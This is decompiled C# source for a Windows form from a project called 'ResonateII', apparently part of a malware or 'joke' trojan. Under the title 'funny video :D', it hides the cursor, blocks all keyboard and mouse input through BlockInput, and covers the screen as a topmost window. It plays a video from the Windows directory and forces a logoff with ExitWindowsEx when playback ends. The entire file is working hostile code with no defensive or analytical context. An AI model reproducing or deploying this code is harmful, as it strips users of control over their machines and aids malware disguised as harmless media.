using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using AxWMPLib;

namespace ResonateII;

public class oab : Form
{
	private static bool m;

	private IContainer components = null;

	private AxWindowsMediaPlayer axWindowsMediaPlayer1;

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

	[DllImport("user32")]
	public static extern bool ExitWindowsEx(uint uFlags, uint dwReason);

	public oab(bool mode)
	{
		m = mode;
		InitializeComponent();
		if (m)
		{
			Cursor.Hide();
			BlockInput(fBlockIt: true);
			((Form)this).set_FormBorderStyle((FormBorderStyle)0);
			((Form)this).set_Size(new Size(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height));
			((Form)this).set_Location(new Point(0, 0));
			((Form)this).set_TopMost(true);
		}
		axWindowsMediaPlayer1.set_URL(Environment.GetEnvironmentVariable("windir") + "\\zz.wmv");
	}

	private void axWindowsMediaPlayer1_PlayStateChange(object sender, _WMPOCXEvents_PlayStateChangeEvent e)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Invalid comparison between Unknown and I4
		if ((int)axWindowsMediaPlayer1.get_playState() == 1 && m)
		{
			ExitWindowsEx(0u, 0u);
		}
	}

	private void oab_Load(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Expected O, but got Unknown
		//IL_00b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00be: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(oab));
		axWindowsMediaPlayer1 = new AxWindowsMediaPlayer();
		((ISupportInitialize)axWindowsMediaPlayer1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)axWindowsMediaPlayer1).set_Dock((DockStyle)5);
		((AxHost)axWindowsMediaPlayer1).set_Enabled(true);
		((Control)axWindowsMediaPlayer1).set_Location(new Point(0, 0));
		((Control)axWindowsMediaPlayer1).set_Name("axWindowsMediaPlayer1");
		((AxHost)axWindowsMediaPlayer1).set_OcxState((State)componentResourceManager.GetObject("axWindowsMediaPlayer1.OcxState"));
		((Control)axWindowsMediaPlayer1).set_Size(new Size(292, 270));
		((Control)axWindowsMediaPlayer1).set_TabIndex(0);
		axWindowsMediaPlayer1.add_PlayStateChange(new _WMPOCXEvents_PlayStateChangeEventHandler(axWindowsMediaPlayer1_PlayStateChange));
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(292, 270));
		((Control)this).get_Controls().Add((Control)(object)axWindowsMediaPlayer1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("oab");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("funny video :D");
		((Form)this).add_Load((EventHandler)oab_Load);
		((ISupportInitialize)axWindowsMediaPlayer1).EndInit();
		((Control)this).ResumeLayout(false);
	}
}
